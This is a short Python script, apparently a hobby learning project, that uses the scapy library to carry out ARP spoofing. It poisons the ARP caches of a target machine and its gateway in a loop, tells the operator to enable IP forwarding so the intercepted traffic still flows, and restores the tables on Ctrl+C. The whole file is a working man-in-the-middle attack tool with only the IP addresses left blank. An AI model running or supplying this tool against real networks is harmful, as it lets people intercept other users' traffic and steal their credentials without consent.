##This is an ARP spoofer. It will send packets to the gateway and the target using `scapy` and run until a keyboard interrupt.
## At this point, it will restore the ARP table. Ideas for future projects include rewriting this program to take user
##input, likely using `argparse`, and also potentially enable automatic port forwarding.

import scapy.all as scapy
import time

print("----{ Be sure to enable port forwarding on host machine! }----\n")
print("---{ Command: sudo sysctl -w net.ipv4.ip_forward=1 }---\n\n")


def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

	return(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
	scapy.send(packet, verbose= False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst = destination_ip, hwdst=destination_mac, psrc = source_ip, hwsrc= source_mac)
	scapy.send(packet, count = 4, verbose = False)


target_ip = ""
gateway_ip = ""

try:
	sent_packets_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[+] Packets sent: " + str(sent_packets_count) + " ", end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
